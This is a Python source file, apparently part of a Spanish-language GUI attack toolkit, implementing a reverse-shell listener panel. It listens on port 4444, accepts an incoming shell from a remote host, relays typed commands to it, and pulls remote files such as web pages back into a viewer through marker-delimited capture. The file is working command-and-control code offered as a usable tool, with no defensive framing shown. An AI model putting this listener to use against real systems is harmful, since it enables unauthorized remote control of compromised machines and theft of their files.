import os
import socket
import threading
import time

import customtkinter as ctk

from ..ui_constants import UI_FONT, UI_FONT_BOLD, MONO_FONT
from ..services import build_remote_read_command


class ListenerPanel(ctk.CTkFrame):
    def __init__(self, app):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.server_socket = None
        self.client_socket = None
        self.is_listening = False
        self.modal = None
        self.capture_active = False
        self.capture_started = False
        self.capture_begin = ""
        self.capture_end = ""
        self.capture_stream = ""
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Listener Python", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", pady=10)
        self.listen_port = ctk.CTkEntry(form, width=140, placeholder_text="4444",
                                        fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                        corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.listen_port.insert(0, "4444")
        self.listen_port.pack(side="left", padx=14, pady=12)

        self.btn_listen = ctk.CTkButton(form, text="Poner a la Escucha", fg_color=c["ACCENT"],
                                        hover_color=c["ACCENT_HOVER"], corner_radius=12, font=UI_FONT_BOLD,
                                        command=self.start_python_listener)
        self.btn_listen.pack(side="left", padx=10, pady=12)

        self.btn_stop = ctk.CTkButton(form, text="Detener", fg_color=c["TEXT_DANGER"],
                                      hover_color="#dc2626", corner_radius=12, font=UI_FONT_BOLD,
                                      command=self.stop_listener, state="disabled", text_color="#0b0b0b")
        self.btn_stop.pack(side="left", padx=10, pady=12)

        info = ctk.CTkLabel(self, text="La terminal aparecerá en una ventana modal al recibir la shell.", text_color=c["TEXT_MUTED"], font=UI_FONT)
        info.pack(pady=10)

    def start_python_listener(self):
        try:
            port = int(self.listen_port.get())
        except ValueError:
            return
        self.app.context.listener_port = port
        if self.app.logger:
            self.app.logger.listener(f"Listener abierto en 0.0.0.0:{port}")
        self.btn_listen.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.is_listening = True
        threading.Thread(target=self.listen_thread, args=(port,), daemon=True).start()

    def listen_thread(self, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(('0.0.0.0', port))
            self.server_socket.listen(1)
            conn, addr = self.server_socket.accept()
            self.client_socket = conn
            if self.app.logger:
                self.app.logger.listener(f"Conexión entrante desde {addr[0]}:{addr[1]}")
            self.after(0, lambda: self.show_modal(addr))
            while self.is_listening:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    msg = data.decode('utf-8', errors='ignore')
                    self.after(0, lambda m=msg: self.append_modal(m))
                except Exception:
                    break
        except Exception as e:
            if self.is_listening:
                self.after(0, lambda: self.append_modal(f"[!] Error socket: {e}\n"))
                if self.app.logger:
                    self.app.logger.error(f"Error socket: {e}", tag="LISTENER")
        finally:
            self.stop_listener()

    def show_modal(self, addr):
        c = self.app.c
        self.modal = ctk.CTkToplevel(self)
        self.modal.title(f"Shell desde {addr[0]}")
        self.modal.geometry("780x420")
        self.modal.configure(fg_color=c["BG_MAIN"])
        self.modal.grab_set()

        self.shell_output = ctk.CTkTextbox(self.modal, height=320, font=MONO_FONT,
                                           fg_color=c["BG_CARD"], text_color=c["TEXT_SUCCESS"])
        self.shell_output.pack(fill="both", expand=True, padx=12, pady=12)
        self.shell_output.insert("end", f"[+] Conexión de {addr[0]}\n")

        tools = ctk.CTkFrame(self.modal, fg_color=c["BG_PANEL"])
        tools.pack(fill="x", padx=12, pady=(0, 10))
        ctk.CTkLabel(tools, text="Leer archivo remoto", text_color=c["TEXT_PRIMARY"], font=UI_FONT_BOLD).pack(side="left", padx=8)

        self.remote_path_entry = ctk.CTkEntry(tools, placeholder_text="/var/www/portal.html",
                                              fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                              corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT, width=280)
        self.remote_path_entry.pack(side="left", padx=8, pady=8)

        self.remote_shell_mode = ctk.CTkSegmentedButton(
            tools,
            values=["Linux", "Windows"],
            fg_color=c["BG_CARD"],
            selected_color=c["ACCENT"],
            text_color=c["TEXT_PRIMARY"]
        )
        self.remote_shell_mode.set("Linux")
        self.remote_shell_mode.pack(side="left", padx=8)

        self.btn_read_remote = ctk.CTkButton(tools, text="Abrir en Viewer",
                                             fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                             corner_radius=10, font=UI_FONT_BOLD,
                                             command=self.request_remote_file)
        self.btn_read_remote.pack(side="left", padx=8)

        self.shell_input = ctk.CTkEntry(self.modal, placeholder_text="Comando (whoami)...",
                                        fg_color=c["BG_CARD"], border_color=c["ACCENT"], border_width=1,
                                        corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.shell_input.pack(fill="x", padx=12, pady=(0, 12))
        self.shell_input.bind("<Return>", self.send_command)
        self.shell_input.focus()

    def append_modal(self, msg):
        if self.modal:
            self.shell_output.insert("end", msg)
            self.shell_output.see("end")
        self._process_capture(msg)

    def send_command(self, event=None):
        if not self.client_socket:
            return
        cmd = self.shell_input.get()
        if not cmd:
            return
        self.shell_input.delete(0, "end")
        self.append_modal(f"> {cmd}\n")
        try:
            self.client_socket.send((cmd + "\n").encode('utf-8'))
        except Exception as e:
            self.append_modal(f"[!] Error enviando: {e}\n")

    def request_remote_file(self):
        if not self.client_socket:
            return
        path = self.remote_path_entry.get().strip()
        if not path:
            return
        marker = f"CN_{int(time.time() * 1000)}"
        self.capture_begin = f"__{marker}_BEGIN__"
        self.capture_end = f"__{marker}_END__"
        self.capture_stream = ""
        self.capture_started = False
        self.capture_active = True
        shell_type = "windows" if self.remote_shell_mode.get().lower() == "windows" else "linux"
        cmd = build_remote_read_command(path, self.capture_begin, self.capture_end, shell_type=shell_type)
        if self.app.logger:
            self.app.logger.listener(f"Solicitando archivo remoto: {path}")
        try:
            self.client_socket.send((cmd + "\n").encode("utf-8"))
        except Exception as e:
            self.append_modal(f"[!] Error enviando: {e}\n")

    def _process_capture(self, msg):
        if not self.capture_active:
            return
        self.capture_stream += msg
        if not self.capture_started:
            if self.capture_begin in self.capture_stream:
                _, rest = self.capture_stream.split(self.capture_begin, 1)
                self.capture_stream = rest
                self.capture_started = True
            else:
                return
        if self.capture_end in self.capture_stream:
            content, rest = self.capture_stream.split(self.capture_end, 1)
            self.capture_stream = rest
            self.capture_active = False
            self.capture_started = False
            viewer = self.app.panels.get("viewer")
            if viewer:
                title = os.path.basename(self.remote_path_entry.get().strip()) or "remote_file"
                viewer.open_content(title, content)
                self.app.show_panel("viewer")
            if self.app.logger:
                self.app.logger.viewer("Archivo remoto abierto en Viewer")

    def stop_listener(self):
        self.is_listening = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass
            self.client_socket = None
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
            self.server_socket = None
        if self.app.logger:
            self.app.logger.listener("Listener detenido")
        self.after(0, self.reset_ui)

    def reset_ui(self):
        self.btn_listen.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        if self.modal:
            self.modal.destroy()
            self.modal = None
